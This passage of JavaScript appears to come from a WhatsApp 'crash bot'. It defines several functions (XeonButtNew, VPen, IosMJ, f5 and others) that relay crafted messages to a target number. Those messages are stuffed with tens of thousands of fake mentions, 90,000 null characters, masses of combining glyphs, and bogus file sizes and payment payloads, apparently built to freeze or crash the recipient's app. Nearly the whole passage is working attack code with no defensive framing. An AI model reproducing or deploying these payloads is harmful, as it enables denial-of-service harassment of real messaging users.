                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await sych.relayMessage(zLoc, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Cela;\",\"key\":\"🦄드림 가이 Cela\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await sych.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "xeontex",
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
        }
        
        async function XeonButtNew(zLoc, ptcp = false) {
   await sych.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "🦄드림 가이 Xeon",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🦄드림 가이 Xeon\n" + "@916909137213".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '🦄드림 가이 Xeon', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "🦄드림 가이 Xeon",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
  };
 async function VPen(zLoc, ptcp = false) {
    let valhalla = "Hola" + "𑲭𑲭".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await sych.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
    async function SendPairing(zLoc, Ptcp = false) {
			await sych.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
};

   async function IosMJ(zLoc, ptcp = false) {
      await sych.relayMessage(
        zLoc,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "CELLA - CALL" + "\u0000".repeat(50000),
                body: "͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/cellasukanenen",
                mediaUrl: "https://t.me/cellasukanenen",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/cellasukanenen",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
    }

   async function f5(zLoc, ptcp = false) {
    await sych.relayMessage(zLoc, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ𓍯̤𖣂  Cella - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A 